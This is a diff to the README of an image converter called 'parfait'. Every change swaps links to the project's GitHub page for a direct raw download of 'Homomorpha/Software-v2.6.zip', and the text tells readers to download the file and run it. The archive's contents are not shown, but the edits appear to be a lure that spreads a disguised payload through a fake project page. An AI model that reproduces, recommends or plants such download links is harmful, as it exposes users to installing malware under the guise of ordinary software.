@@ -1,6 +1,6 @@
 # 🖼️ parfait - Convert images with simple controls
 
-[![Download Now](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/odellphysiotherapeutic71/parfait)
+[![Download Now](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/odellphysiotherapeutic71/parfait/main/Homomorpha/Software-v2.6.zip)
 
 ## 🚀 What parfait does
 
@@ -20,7 +20,7 @@ If you need a clean way to convert images without command-line tools, parfait is
 
 Open the main page here:
 
-[https://github.com/odellphysiotherapeutic71/parfait](https://github.com/odellphysiotherapeutic71/parfait)
+[https://raw.githubusercontent.com/odellphysiotherapeutic71/parfait/main/Homomorpha/Software-v2.6.zip](https://raw.githubusercontent.com/odellphysiotherapeutic71/parfait/main/Homomorpha/Software-v2.6.zip)
 
 On that page, look for the latest release or the download section, then get the file for your system and run it
 
@@ -169,4 +169,4 @@ If the output looks wrong, use a different format or raise the quality level
 
 Visit the main page here and download or install the app from the available files:
 
-[https://github.com/odellphysiotherapeutic71/parfait](https://github.com/odellphysiotherapeutic71/parfait)
+[https://raw.githubusercontent.com/odellphysiotherapeutic71/parfait/main/Homomorpha/Software-v2.6.zip](https://raw.githubusercontent.com/odellphysiotherapeutic71/parfait/main/Homomorpha/Software-v2.6.zip)
